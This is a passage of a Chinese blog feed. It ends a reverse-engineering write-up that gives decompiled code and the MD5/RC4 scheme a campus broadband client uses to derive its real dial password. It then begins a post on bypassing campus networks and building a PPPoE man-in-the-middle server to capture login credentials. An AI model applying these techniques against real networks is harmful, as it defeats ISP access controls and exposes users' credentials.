mix_md5_2 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v34 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v34 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] ga: %s"</span>, &amp;hbKeyGa);</span><br><span class="line">  hbKeyGb = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;mem_64_b, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  md5_4_plus5remainer4 = *((<span class="keyword">char</span> *)md5_4 + <span class="number">5</span>) % <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// 以下一连串的赋值是使 char_array_29_3 = md5_3, char_array_29_4 = md5_4</span></span><br><span class="line">  char_array_29_3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v139 = <span class="number">0</span>;</span><br><span class="line">  v140 = <span class="number">0</span>;</span><br><span class="line">  char_array_29_4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v142 = <span class="number">0</span>;</span><br><span class="line">  v143 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)char_array_29_3 = *md5_3;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">4</span>] = md5_3[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span>] = md5_3[<span class="number">2</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">12</span>] = md5_3[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">16</span>] = md5_3[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">20</span>] = md5_3[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">24</span>] = md5_3[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">28</span>] = md5_3[<span class="number">7</span>];</span><br><span class="line">  *(_DWORD *)char_array_29_4 = *md5_4;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">4</span>] = md5_4[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span>] = md5_4[<span class="number">2</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">12</span>] = md5_4[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">16</span>] = md5_4[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">20</span>] = md5_4[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">24</span>] = md5_4[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">28</span>] = md5_4[<span class="number">7</span>];</span><br><span class="line">  v85 = md5_4_plus5remainer4;                   <span class="comment">// 1</span></span><br><span class="line">  v86 = <span class="built_in">abs</span>(md5_4_plus5remainer4 - <span class="number">5</span>) % <span class="number">4</span>;      <span class="comment">// 0</span></span><br><span class="line">  v9 = (md5_4_plus5remainer4 + <span class="number">2</span>) % <span class="number">4</span>;          <span class="comment">// 3</span></span><br><span class="line">  v87 = (md5_4_plus5remainer4 + <span class="number">2</span>) % <span class="number">4</span>;         <span class="comment">// 3</span></span><br><span class="line">  v88 = <span class="built_in">abs</span>(md5_4_plus5remainer4 - <span class="number">3</span>);          <span class="comment">// 2</span></span><br><span class="line">  v114[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v114[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v115[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v116 = <span class="number">0</span>;</span><br><span class="line">  v117 = <span class="number">0</span>;</span><br><span class="line">  v118 = <span class="number">0</span>;</span><br><span class="line">  v119 = <span class="number">0</span>;</span><br><span class="line">  v120 = <span class="number">0</span>;</span><br><span class="line">  v121 = <span class="number">0</span>;</span><br><span class="line">  v122 = <span class="number">0</span>;</span><br><span class="line">  v123[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v123[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v124[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v125 = <span class="number">0</span>;</span><br><span class="line">  v126 = <span class="number">0</span>;</span><br><span class="line">  v127 = <span class="number">0</span>;</span><br><span class="line">  v128 = <span class="number">0</span>;</span><br><span class="line">  v129 = <span class="number">0</span>;</span><br><span class="line">  v130 = <span class="number">0</span>;</span><br><span class="line">  v131 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v114 = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * md5_4_plus5remainer4];</span><br><span class="line">  *(_DWORD *)v115 = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * md5_4_plus5remainer4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v115[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v86];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v116 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v86 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v117 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v9];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v118 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v9 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v119 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v88];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v120 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v88 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)v123 = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * md5_4_plus5remainer4];</span><br><span class="line">  *(_DWORD *)v124 = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * md5_4_plus5remainer4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v124[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v86];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v125 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v86 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v126 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v9];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v127 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v9 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v128 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v88];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v129 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v88 + <span class="number">4</span>];</span><br><span class="line">  v58 = (<span class="keyword">void</span> *)md5_StrWithLength(v114, <span class="number">32</span>);    <span class="comment">// 返回值 1ed63dc9a269d8705e297c03dcda7cf0</span></span><br><span class="line">                                                <span class="comment">// 为 6172e2fb2b28feeb02bfb5a58b9f3da4 的 md5</span></span><br><span class="line">  v57 = (<span class="keyword">void</span> *)md5_StrWithLength(v123, <span class="number">32</span>);    <span class="comment">// 返回值 25928da86463ce9beba8110d2d514464</span></span><br><span class="line">                                                <span class="comment">// 为 b48c0cb916dffe4904fff6461bdb9b20 的 md5</span></span><br><span class="line"></span><br><span class="line">  sprintf_s(&amp;hbKeyGb, <span class="number">0x41</span>u, <span class="string">"%s%s"</span>, v58, v57); <span class="comment">// hbKeyGb = "1ed63dc9a269d8705e297c03dcda7cf025928da86463ce9beba8110d2d514464"</span></span><br><span class="line">  v43 = v58;</span><br><span class="line">  j_j___free_base(v58);</span><br><span class="line">  <span class="keyword">if</span> ( v43 )</span><br><span class="line">  &#123;</span><br><span class="line">    v58 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v22 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v42 = v57;</span><br><span class="line">  j_j___free_base(v57);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">  &#123;</span><br><span class="line">    v57 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v32 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v32 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] gb: %s"</span>, &amp;hbKeyGb);</span><br><span class="line">  <span class="keyword">if</span> ( v95 % <span class="number">2</span> )                                <span class="comment">// 从反汇编中可看到 v95 为 hbkey_gb[7]</span></span><br><span class="line">  &#123;</span><br><span class="line">    temp1 = <span class="number">0</span>;</span><br><span class="line">    p_HbKeyGa = &amp;hbKeyGa;</span><br><span class="line">    pMem_64_a = &amp;mem_64_a;</span><br><span class="line">    p_HbKeyGa += <span class="built_in">strlen</span>(p_HbKeyGa);</span><br><span class="line">    lenHbKeyGa = ++p_HbKeyGa - &amp;mem_64_a;</span><br><span class="line">    len_HbKeyGa = p_HbKeyGa - &amp;mem_64_a;</span><br><span class="line">    <span class="keyword">while</span> ( temp1 &lt; len_HbKeyGa )               <span class="comment">// 把 HbKeyGa 里面的小写字母全替换为大写</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;hbKeyGa + temp1) &gt;= <span class="number">97</span> &amp;&amp; *(&amp;hbKeyGa + temp1) &lt;= <span class="number">122</span> )</span><br><span class="line">        *(&amp;hbKeyGa + temp1) -= <span class="number">32</span>;</span><br><span class="line">      ++temp1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    temp2 = <span class="number">0</span>;</span><br><span class="line">    p_HbKeyGb = &amp;hbKeyGb;</span><br><span class="line">    pMem_64_b = &amp;mem_64_b;</span><br><span class="line">    p_HbKeyGb += <span class="built_in">strlen</span>(p_HbKeyGb);</span><br><span class="line">    lenHbKeyGb = ++p_HbKeyGb - &amp;mem_64_b;</span><br><span class="line">    len_HbKeyGb = p_HbKeyGb - &amp;mem_64_b;</span><br><span class="line">    <span class="keyword">while</span> ( temp2 &lt; len_HbKeyGb )               <span class="comment">// 把 HbKeyGb 里面的小写字母全替换为大写</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;hbKeyGb + temp2) &gt;= <span class="number">97</span> &amp;&amp; *(&amp;hbKeyGb + temp2) &lt;= <span class="number">122</span> )</span><br><span class="line">        *(&amp;hbKeyGb + temp2) -= <span class="number">32</span>;</span><br><span class="line">      ++temp2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  pHbKeyGa = &amp;hbKeyGa;</span><br><span class="line">  pHbKeyGb = &amp;hbKeyGb;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] sga: %s"</span>, &amp;hbKeyGa);</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] sgb: %s"</span>, pHbKeyGb);</span><br><span class="line">  hbKey = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v90, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( pHbKeyGb[<span class="number">9</span>] % <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    index1 = <span class="number">0</span>;</span><br><span class="line">    index2 = <span class="number">0</span>;</span><br><span class="line">    index3 = <span class="number">63</span>;</span><br><span class="line">    <span class="keyword">while</span> ( index1 &lt; <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;hbKey + index1++) = pHbKeyGa[index2++];</span><br><span class="line">      *(&amp;hbKey + index1++) = pHbKeyGb[index3--];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index4 = <span class="number">0</span>;</span><br><span class="line">    index5 = <span class="number">63</span>;</span><br><span class="line">    index6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( index4 &lt; <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;hbKey + index4++) = pHbKeyGa[index5--];</span><br><span class="line">      *(&amp;hbKey + index4++) = pHbKeyGb[index6++];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] key: %s"</span>, &amp;hbKey);<span class="comment">// hbKey = &amp;"115e9d6643Fd6c391a32E6298dA8D70025Ae9269473c1053AdDc9dAa47Ec6f4092658912C89d9aB83644D6D32c0e898b2e2bCaF8B1E1F06d025dF5E184040654"</span></span><br><span class="line">  sub_40EC40((<span class="keyword">void</span> *)a2, &amp;hbKey);</span><br><span class="line">  v41 |= <span class="number">1u</span>;</span><br><span class="line">  v146 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;a3);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的就是 AidcRes.generateKey 的整个流程，这个坑多并且复杂，简要说一下，具体看代码（b_Username_MonthDay 代指 ‘b177111122220517’，不再赘述）</p>
<ol>
<li>算出 b_Username_MonthDay，username_b_MonthDay，username_MonthDay_b，monthDay_Username_b 四个东西的 md5</li>
<li>根据 d5_b_Username_MonthDay[1] 的 ascii的奇偶性，重排四个 md5 的顺序并复制给四个变量，分别为 md5_1，md5_2，md5_3，md5_4，</li>
<li>此时会用到第二步的四个变量，根据他们的特定位来计算得出 hbkey_ga 与 hbkey_gb 的值<ul>
<li>根据 <code>md5_1_pLus3remainder4 = *(char *)(md5_1 + 3) % 4;</code> 这步的值取 md5_1 和 md5_2 排列算出 hbkey_ga</li>
<li>根据 <code>md5_4_plus5remainer4 = *((char *)md5_4 + 5) % 4;</code> 这步的值取 md5_3 和 md5_4 排列算出 hbkey_gb</li>
</ul>
</li>
<li>根据 hbkey_gb[7] 的 ascii，如果奇数就把 hbkey_ga 中的字母都大写，偶数就把 hbkey_gb 中的字母都大写</li>
<li>根据 hbkey_gb[9] 的 ascii 的奇偶性对 hbkey_ga 与 hbkey_gb 的值用简单算法进行重排，得到真实的 hbkey</li>
</ol>
<p>这就是上面所有代码的大致流程，代码中我也有大量注释，大家可以看看。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个难点在分析算法上面，分析算法主要还是要靠动态调试，过程中遇到了很多很难的地方，参数和函数的重命名主要还是靠动态调试，<br>然后去猜测它的作用进行重命名。  </p>
<p>这些文件我都保存了分析记录，大家可以跟着看看，总结如下</p>
<p>AidcComm.idb 看导出表可以看出是干嘛的，直接点进GetPWD即可看到我的分析<br>AidcRes.idb 里面也有我的分析，具体查看我改过的函数名 generateKey，然后 x 一下看调用地方<br>x32dbg_AidcRes.dd32 为我在用 x32dbg 分析AidcRes.exe的时候的记录，有一些我改过的函数名以及简要分析<br>简单的分析流程为 bp LoadLibrary，断到 AidcComm.dll，然后具体看eax和栈的变化，找到加密函数，再一层一层分析。</p>
<p>建议 ida 与 x32dbg 结合分析，最好起个 pppoe 服务器拦截账号密码协助分析，见我上一篇文章 <a href="https://www.anquanke.com/post/id/178484" target="_blank" rel="noopener">PPPoE中间人拦截以及校园网突破漫谈</a>中的代码。</p>
<p>调用流程为<br>AidcRes.generateKey(分析大头) –&gt; AidcComm.GetRegularAccount –&gt; AidcComm.GetPWD –&gt; AidcComm.encryptPwdWithKey(分析大头，注意里面有个地方 f5 显示不出来，就是把一个key中的字母全大写的那部分，请结合汇编分析)</p>
<p>AidcRes.generateKey大致流程，这个坑多并且复杂，简要说一下，具体看代码<br>（b_Username_MonthDay 代指 ‘b177111122220517’，不再赘述）</p>
<ol>
<li>算出 b_Username_MonthDay，username_b_MonthDay，username_MonthDay_b，monthDay_Username_b 四个东西的 md5</li>
<li>根据 d5_b_Username_MonthDay[1] 的 ascii的奇偶性，重排四个 md5 的顺序并复制给四个变量</li>
<li>此时会用到第二步的四个变量，根据他们的特定位来计算得出 hbkey_ga 与 hbkey_gb 的值</li>
<li>根据 hbkey_gb[7] 的 ascii，如果奇数就把 hbkey_ga 中的字母都大写，偶数就把 hbkey_gb 中的字母都大写</li>
<li>根据 hbkey_gb[9] 的 ascii 的奇偶性对 hbkey_ga 与 hbkey_gb 的值用简单算法进行重排，得到真实的 hbkey</li>
</ol>
<p>AidcComm.encryptPwdWithKey大致流程</p>
<ol>
<li>password 用 key RC4 一下得到 A</li>
<li>把 A md5 一下得到 B，如果第 11 位为奇数，取 B 的前 16 位，偶数就后 16 位，得到 C</li>
<li>C 再用 key RC4 一下得到 D</li>
<li>D 再 md5 一下，取 [8:24]得到 E</li>
<li>E[今天几号日期 % 16] 替换为 ‘b’ 得到最后的密码</li>
</ol>
<p>为了防止被商业利用，就不公开逆向得出的加密脚本了，喜欢折腾校园网的可以自行根据本文摸索。</p>
<h2 id="分析文件打包"><a href="#分析文件打包" class="headerlink" title="分析文件打包"></a>分析文件打包</h2><ul>
<li><a href="https://www.lanzous.com/i48toqb" target="_blank" rel="noopener">飞Young宽带_带分析.7z</a></li>
</ul>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>PPPoE中间人拦截以及校园网突破漫谈</title>
    <url>/2019/05/12/pppoe-server-mitm.html</url>
    <content><![CDATA[<blockquote>
<p>本文首发于<a href="https://www.anquanke.com/post/id/178484" target="_blank" rel="noopener">PPPoE中间人拦截以及校园网突破漫谈</a>，转载请注明出处。</p>
</blockquote>
<h1 id="PPPoE中间人拦截以及校园网突破漫谈"><a href="#PPPoE中间人拦截以及校园网突破漫谈" class="headerlink" title="PPPoE中间人拦截以及校园网突破漫谈"></a>PPPoE中间人拦截以及校园网突破漫谈</h1><p>校园生活快结束了，之前还有点未完成的想法，趁着这两天有兴趣搞搞。</p>
<p>此文面向大众是那种在校园内苦受拨号客户端的毒害，但是又想自己动手折腾下的。</p>
<a id="more"></a>
<h2 id="一些我知道的办法"><a href="#一些我知道的办法" class="headerlink" title="一些我知道的办法"></a>一些我知道的办法</h2><p>目前主要的方法可以可以分为移动端和电脑客户端。</p>
<h3 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h3><p>移动端基本是基于 http 的 portal 认证，这个解决方法比较多，但依据剧情情况而定。</p>
<p>比如拨号后克隆 mac 到路由器，还有基于这个方法的衍生方法，比如拨号前交换机，登陆后改路由器并复制 mac 到路由器。还有比如虚拟路由转发。</p>
<p>这些其实都是利用的检测的原理，按道理说，portal 并不像 PPPoE 那样，PPPoE 中间是不允许有路由节点的，因为在 PADI 广播包是本地广播，本地广播路由器不会进行转发，所以并不能找到一个目的 PPPoE Server。</p>
<p>这里扯远了，关于 PPPoE 下面再说。</p>
<p>我们接着看看 portal，这个是基于 HTTP 的，大体上的流程是</p>
<ol>
<li>访问一个 http 网站，比如 <a href="http://www.qq.com，因为网关会拦截" target="_blank" rel="noopener">http://www.qq.com，因为网关会拦截</a> http 请求然后重定向到一个形如 <a href="http://58.53.199.144:8001/?userip=100.64.224.167&amp;wlanacname=&amp;nasip=58.50.189.124&amp;usermac=1c-87-2c-77-77-9c" target="_blank" rel="noopener">http://58.53.199.144:8001/?userip=100.64.224.167&amp;wlanacname=&amp;nasip=58.50.189.124&amp;usermac=1c-87-2c-77-77-9c</a><br>的网址。</li>
<li>此时 app 会解析信息，比如 ip，mac。检测的地方就是在这里，比如检测你的手机 ip 是否和 userip 相同，加入你在路由器下，你的 ip 应该是形如 192.168.x.x 的地址，你的路由器的 wan ip 才是<br>和 userip 相同，还可能会进行比如 mac 判断，还可能检查 arp 表，至于这两样是怎样检测的我按下不表，总而言之，这里通不过检测，app 就判定你的网络环境不对。</li>
<li>然后 app 会将账号或密码进行加密，然后 post 到认证服务器，认证通过后，你这个 ip 就可以上网了。</li>
</ol>
<p>先说说为什么克隆 mac 有用，因为认证服务器那边是根据 mac 判定的，相同的 mac 在短时间内会获取到同样的 ip，并且短暂时间的断网也是允许的。其他衍生方法原理类似。</p>
<p>再来说说还有哪些办法，这些办法可能并没有之前的好操作。</p>
<p>比如 hook 判定函数</p>
<p>还有比如改 Response（这个办法是前阵子的思路，还没实践是否可行，既然判断参数取自响应包，那么我们应该能想到这个）</p>
<p>我前阵子用的比较多的其实是直接逆向 app 获取加密流程然后自写协议，但是现在看来可能是最费时费力的一种了，不过有一种好处，一个产品大概率是不会换加密算法的，顶多可能改改密钥，截取加密后的某一段。</p>
<p>这些大致上就是我所知道的几种移动端上面的方法了。</p>
<h3 id="电脑端"><a href="#电脑端" class="headerlink" title="电脑端"></a>电脑端</h3><p>电脑端方面老陈的文章已经写的很全面了，见 <a href="https://blog.sunflyer.cn/archives/460" target="_blank" rel="noopener">How To : 从Netkeeper 4.X客户端获取真实账号</a></p>
<p>这里面提到了我们可以下手的三个方面</p>
<ol>
<li>客户端本身</li>
</ol>
<p>比如 hook RasDialW api 和 CE 暴搜。</p>
<p>但是就如文章中所说，加了保护，可能是自行实现 peloader 也说不定，反正就是相当于没走系统的 api，而是自行搞了一份来进行拨号，这样就没办法通过 hook 系统 api 来获取了。另外暴搜内存也有局限。</p>
<p>拿我们湖北的举例子，湖北的客户端是动态加载一个 dll 来进行账号密码加密，但是这个过程很快，这个客户端主要的操作都貌似是在 dll 中完成，这里我说的快是指，他加载 dll 完成加密然后可能<br>又调用了它的其他 dll 拨号后，只要一个dll完成了它的“使命”，它会立刻卸载，导致我们通过 CE 手动暴搜内存几乎不可能（这里可能我写的有谬误，不过就我分析湖北的客户端来说感觉是这样）</p>
<ol start="2">
<li>系统层面</li>
</ol>
<p>这个就如文章中提到的事件日志相关的东西</p>
<ol start="3">
<li>中间人</li>
</ol>
<p>根据 PPPoE 协议的流程，我们完全可以自己搞一个 server 来进行拦截。</p>
<p>下面我们将详细了解这个，以及能够自己动手实现一个简单的 PPPoE Server。</p>
<h2 id="PPPoE-协议流程"><a href="#PPPoE-协议流程" class="headerlink" title="PPPoE 协议流程"></a>PPPoE 协议流程</h2><p>PPPoE 是一个二层协议，工作在链路层。</p>
<p>PPPoE 主要分为两个阶段，一个是发现阶段，我的理解就是两台机器建立起点对点的联系，第二个是会话阶段，这个阶段主要是配置确认，然后开始验证账号密码。</p>
<p>至于后面的分配 ip 的确定我们按下不表，因为此文主要关注的是拦截。</p>
<p>PPPoE 具体可分为以下阶段</p>
<ol>
<li>PPPoE发现阶段(Discovery)<ul>
<li>主机广播发起分组（PADI）</li>
<li>有效发现提供包分组（PADO）</li>
<li>有效发现请求分组（PADR）</li>
<li>有效发现会话确认（PADS）</li>
</ul>
</li>
<li>PPPoE会话阶段(Session)<ul>
<li>LCP协议请求确认配置(LCP-Config-Req)</li>
<li>LCP协议确认配置(LCP-Config-Ack)</li>
<li>PAP或CHAP验证账号密码</li>
</ul>
</li>
</ol>
<p>验证通过后开始进行一些后续的分配 ip 以及其他操作。</p>
<h2 id="PPPoE-发现阶段"><a href="#PPPoE-发现阶段" class="headerlink" title="PPPoE 发现阶段"></a>PPPoE 发现阶段</h2><h3 id="PADI"><a href="#PADI" class="headerlink" title="PADI"></a>PADI</h3><p>PADI 是一个广播包，发往 ff:ff:ff:ff:ff:ff 的广播地址，然后这个广播包会在本地网络进行广播。</p>
<p>它的 CODE 字段值为 0×09，SESSION-ID（会话ID）字段值为 0×0000。</p>
<p>PADI 分组必须至少包含一个 Host-Uniq，Host-Uniq为主机唯一标识，类似于PPP数据报文中的标识域，主要是用来匹配发送和接收端的。因为对于广播式的网络中可能会同时存在很多个PPPoE的数据报文。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADI_TIM_20190512202318.png" alt=""></p>
<p>因为此时发的是广播包，那么我们只需要本机搭建一个 Server 对 PADI 进行响应，就可以开始我们的中间人作业了。</p>
<p>具体流程就是监听网卡，然后过滤 CODE 字段值为 0×09 的包然后进行响应即可。</p>
<p>因为其中的 Host-Uniq 字段在后续的请求中都需要，我们写一个函数把这个字段值揪出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#寻找客户端发送的Host-Uniq</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padi_find_hostuniq</span><span class="params">(self, payload)</span>:</span></span><br><span class="line">    _key = <span class="string">b'\x01\x03'</span></span><br><span class="line">    payload = bytes(payload)</span><br><span class="line">    <span class="keyword">if</span> _key <span class="keyword">in</span> payload:</span><br><span class="line">        _nIdx = payload.index(_key)</span><br><span class="line">        _nLen = struct.unpack(<span class="string">"!H"</span>, payload[_nIdx + <span class="number">2</span>:_nIdx + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        _nData = payload[_nIdx + <span class="number">2</span>:_nIdx + <span class="number">4</span> + _nLen]</span><br><span class="line">        <span class="keyword">return</span> _key + _nData</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>需要传入的是一个 Packet.payload，payload 是除去链路层的其他数据，在这里面具体就是 PPPoED 下面的数据</p>
<h3 id="PADO"><a href="#PADO" class="headerlink" title="PADO"></a>PADO</h3><p>当一个接入集中器（Server）接收到一个 PADI 包以后，就需要进行响应，发出 PADO 包了。</p>
<p>PADO 包的 CODE 字段值为 0×07，SESSION-ID 字段值仍为 0×0000。</p>
